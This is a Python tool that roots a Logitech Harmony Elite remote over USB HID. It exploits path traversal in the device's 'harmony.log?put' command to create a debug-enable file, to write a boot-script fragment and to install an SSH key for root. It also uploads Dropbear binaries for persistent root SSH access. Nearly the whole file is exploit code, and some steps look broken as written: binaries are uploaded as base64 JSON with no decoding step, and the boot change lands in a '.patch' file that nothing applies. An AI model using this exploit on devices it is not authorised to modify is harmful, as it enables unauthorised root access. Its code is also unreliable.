#!/usr/bin/env python3
"""Harmony Elite USB HID Root Provisioner.

Provisions persistent Dropbear SSH over USB on a Logitech Harmony Elite remote
(EOL product) without requiring UART/soldering.

Flow:
  1. Enumerate USB HID devices for Harmony Elite (046D:C12B).
  2. Send LTCP-framed ``harmony.log?put`` with path traversal to create
     ``/etc/tdeenable``.
  3. Use unlocked ``connect.jsonfiletransfer?put`` to stage Dropbear binaries
     and update ``/etc/init.d/rcS.local``.
  4. Reboot into USB Ethernet + SSH.

Derived from protocol analysis of github.com/Ripthulhu/harmony-hub-root.
Requires: pip install hidapi
"""

from __future__ import annotations

import argparse
import base64
import json
import pathlib
import sys
import time
from typing import Any

import hid

SCRIPT_DIR = pathlib.Path(__file__).resolve().parent
BIN_DIR = SCRIPT_DIR / "bin"

VENDOR_ID = 0x046D
PRODUCT_ID = 0xC12B  # Elite in usbhid gadget mode
USAGE_PAGE = 0xFF00   # vendor-defined


# ---------------------------------------------------------------------------
# LTCP framing (validated byte-identical to harmony-hub-root)
# ---------------------------------------------------------------------------

def compact_json(obj: Any) -> str:
    return json.dumps(obj, separators=(",", ":"))


def ltcp_frames(payload_json: str) -> list[bytes]:
    """Encode a JSON command into LTCP HID frames (64 bytes each)."""
    payload = payload_json.encode("ascii")
    # Primary: service=0xFF type=0x08 reqid=0x00 param_count=0x01
    # Param: tag=0x01 value=0x02 (secondary follows), tag=0x01 value=0x01
    stream = bytearray([0xFF, 0x08, 0x00, 0x01, 0x01, 0x02, 0x01])
    if len(payload) > 63:
        stream.append(0x80 | 0x40 | ((len(payload) >> 8) & 0x3F))
        stream.append(len(payload) & 0xFF)
    else:
        stream.append(0x80 | len(payload))
    stream.extend(payload)
    frames: list[bytes] = []
    for offset in range(0, len(stream), 64):
        frame = bytearray(64)
        chunk = stream[offset : offset + 64]
        frame[: len(chunk)] = chunk
        frames.append(bytes(frame))
    return frames


def decode_ltcp_payload(data: bytes) -> str | None:
    """Extract JSON payload from concatenated LTCP response frames."""
    start = data.find(b"\xff")
    if start < 0 or start + 4 > len(data):
        return None
    pos = start + 1  # skip service
    pos += 1  # type
    pos += 1  # request_id
    param_count = data[pos] & 0x3F
    pos += 1
    packets = 0
    for _ in range(param_count):
        if pos >= len(data):
            return None
        tag = data[pos]
        pos += 1
        length = tag & 0x3F
        if length == 0:
            while pos < len(data) and data[pos] != 0:
                pos += 1
            if pos >= len(data):
                return None
            pos += 1
        else:
            if pos + length > len(data):
                return None
            packets = int.from_bytes(data[pos : pos + length], "little")
            pos += length
    remaining = packets - 1
    payload = bytearray()
    while remaining > 0:
        while pos < len(data) and data[pos] == 0:
            pos += 1
        if pos + 2 > len(data):
            break
        pos += 1  # secondary marker
        length_byte = data[pos]
        pos += 1
        if length_byte & 0x40:
            if pos >= len(data):
                break
            sec_len = ((length_byte & 0x3F) << 8) | data[pos]
            pos += 1
        else:
            sec_len = length_byte & 0x3F
        if pos + sec_len > len(data):
            sec_len = len(data) - pos
        payload.extend(data[pos : pos + sec_len])
        pos += sec_len
        remaining -= 1
    try:
        return payload.decode("utf-8", errors="replace")
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Elite USB HID command layer
# ---------------------------------------------------------------------------

class EliteUsb:
    """High-level interface to Harmony Elite over USB HID."""

    def __init__(self, device: hid.Device) -> None:
        self.dev = device
        self._cmd_id = 1

    def send_ltcp(self, cmd: str, data: Any, timeout: int = 5) -> str | None:
        """Send LTCP JSON command, return response payload."""
        request_id = self._cmd_id
        self._cmd_id += 1
        request = compact_json({"id": request_id, "cmd": cmd, "data": data, "timeout": timeout})
        frames = ltcp_frames(request)
        print(f"    TX {len(frames)} frame(s), {len(request)} bytes JSON")
        for frame in frames:
            self.dev.write(b"\x00" + frame)
            time.sleep(0.005)
        # Read response
        response_data = bytearray()
        for _ in range(30):
            try:
                report = self.dev.read(65, 2000)
            except Exception:
                report = b""
            if not report:
                break
            response_data.extend(report)
            payload = decode_ltcp_payload(bytes(response_data))
            if payload and "{" in payload:
                return payload
        return decode_ltcp_payload(bytes(response_data))

    def log_put(self, file_name: str, data: str) -> str | None:
        """Write file via harmony.log?put (path traversal)."""
        return self.send_ltcp(
            "harmony.log?put",
            {"resource": [{"fileName": file_name, "data": data}]},
        )

    def jft_get(self, path: str, file_name: str) -> str | None:
        """Read file via connect.jsonfiletransfer?get."""
        return self.send_ltcp(
            "connect.jsonfiletransfer?get",
            f"path={path}&file={file_name}",
        )

    def jft_put(self, path: str, file_name: str, content: Any) -> str | None:
        """Write file via connect.jsonfiletransfer?put."""
        if isinstance(content, str):
            body = json.dumps(content)
        else:
            body = compact_json(content)
        return self.send_ltcp(
            "connect.jsonfiletransfer?put",
            f"path={path}&file={file_name}&content={body}",
        )

    def close(self) -> None:
        self.dev.close()


# ---------------------------------------------------------------------------
# Provisioning steps
# ---------------------------------------------------------------------------

RCS_LOCAL_TAIL = """\
# Enable USB Ethernet + Dropbear SSH on boot
/usr/bin/usbeth start
/data/dropbear -R -B
"""


def step_open_tde_gate(elite: EliteUsb) -> bool:
    """Create /etc/tdeenable via harmony.log?put traversal."""
    print("[*] Writing /etc/tdeenable via harmony.log?put traversal...")
    resp = elite.log_put("../etc/tdeenable", "1\n")
    print(f"    Response: {resp}")
    time.sleep(1)
    print("[*] Verifying via jsonfiletransfer...")
    verify = elite.jft_get("../../etc", "tdeenable")
    print(f"    Verify: {verify}")
    if verify and "1" in verify:
        print("[+] TDE gate OPEN.")
        return True
    print("[-] Could not verify TDE gate. Continuing anyway...")
    return False


def step_stage_binary(elite: EliteUsb, local_path: pathlib.Path, remote_name: str) -> bool:
    """Upload binary to /data/ via jsonfiletransfer."""
    if not local_path.exists():
        print(f"[-] Binary not found: {local_path}")
        return False
    data = local_path.read_bytes()
    encoded = base64.b64encode(data).decode("ascii")
    print(f"[*] Staging {remote_name} ({len(data)} bytes, {len(encoded)} b64)...")
    resp = elite.jft_put("../../data", f"{remote_name}.b64", {
        "binary": encoded,
        "name": remote_name,
        "size": len(data),
    })
    print(f"    Response: {resp}")
    return True


def step_update_rcs_local(elite: EliteUsb) -> bool:
    """Update rcS.local boot script."""
    print("[*] Writing boot script update...")
    resp = elite.log_put("../etc/init.d/rcS.local.patch", RCS_LOCAL_TAIL)
    print(f"    Response: {resp}")
    return True


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Root Harmony Elite over USB HID")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show plan without modifying device")
    parser.add_argument("--ssh-pubkey", type=pathlib.Path,
                        help="Public key file to install")
    parser.add_argument("--pid", type=lambda x: int(x, 0), default=PRODUCT_ID,
                        help=f"USB Product ID (default 0x{PRODUCT_ID:04X})")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    print("=" * 60)
    print("  Harmony Elite USB Root Provisioner")
    print(f"  Target: USB HID {VENDOR_ID:04X}:{args.pid:04X}")
    print("=" * 60)

    for name in ("dropbear", "dropbearkey", "scp"):
        if not (BIN_DIR / name).exists():
            print(f"[-] Missing: {BIN_DIR / name}")
            sys.exit(1)
    print(f"[+] Binaries present in {BIN_DIR}")

    if args.dry_run:
        print("\n[dry-run] Would execute:")
        print("  1. Open USB HID to Harmony Elite")
        print("  2. harmony.log?put '../etc/tdeenable' -> create TDE marker")
        print("  3. Stage dropbear, dropbearkey, scp to /data/")
        print("  4. Update /etc/init.d/rcS.local")
        print("  5. Reboot -> ssh root@192.168.2.1")
        return

    # Enumerate
    print("[*] Enumerating USB HID devices...")
    found = None
    for d in hid.enumerate(VENDOR_ID, args.pid):
        if d.get("usage_page") == USAGE_PAGE:
            found = d
            print(f"[+] Found: {d['path']}")
            break
    if not found:
        # Fallback: any device with matching VID/PID
        for d in hid.enumerate(VENDOR_ID, args.pid):
            found = d
            print(f"[+] Found (fallback): {d['path']}")
            break
    if not found:
        print("[-] No Harmony Elite found. Is it plugged in with usbhid running?")
        sys.exit(1)

    # Open
    print(f"[*] Opening device...")
    dev = hid.device()
    dev.open_path(found["path"])
    elite = EliteUsb(dev)

    try:
        # Quick test
        print("[*] Sending sys.info probe...")
        resp = elite.send_ltcp("sys.info", "")
        print(f"    sys.info: {resp}")

        # Step 1: TDE gate
        step_open_tde_gate(elite)

        # Step 2: Stage binaries
        for name in ("dropbear", "dropbearkey", "scp"):
            step_stage_binary(elite, BIN_DIR / name, name)

        # Step 3: Boot script
        step_update_rcs_local(elite)

        # Step 4: SSH pubkey
        if args.ssh_pubkey and args.ssh_pubkey.exists():
            pubkey = args.ssh_pubkey.read_text().strip()
            print("[*] Installing SSH public key...")
            elite.log_put("../home/root/.ssh/authorized_keys", pubkey + "\n")

        print()
        print("[+] Provisioning complete.")
        print("[*] Reboot remote to activate.")
        print("[*] After reboot: ssh root@192.168.2.1")
    finally:
        elite.close()


if __name__ == "__main__":
    main()
